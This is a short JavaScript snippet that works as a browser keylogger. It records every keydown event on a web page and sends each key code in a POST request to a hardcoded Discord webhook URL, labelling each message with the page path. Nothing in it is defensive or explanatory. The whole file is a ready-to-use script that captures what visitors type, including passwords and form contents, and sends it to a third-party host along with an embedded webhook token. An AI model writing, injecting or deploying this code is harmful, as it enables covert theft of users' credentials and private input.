document.addEventListener('keydown', logKey);

function logKey(e) {
  log.textContent += ` ${e.code}`;
  sendMessage(e.code);
}

function sendMessage(message) {
const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/965619205942698004/_4Oa1M_C6gcmZfLsN9bAWck-BHS9B1aswrb8Au0mIWQdmE7KKj6Cc16qeToiz0SZ_UQT");

  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: window.location.pathname,
    avatar_url: "",
    content: message
  }

  request.send(JSON.stringify(params));
}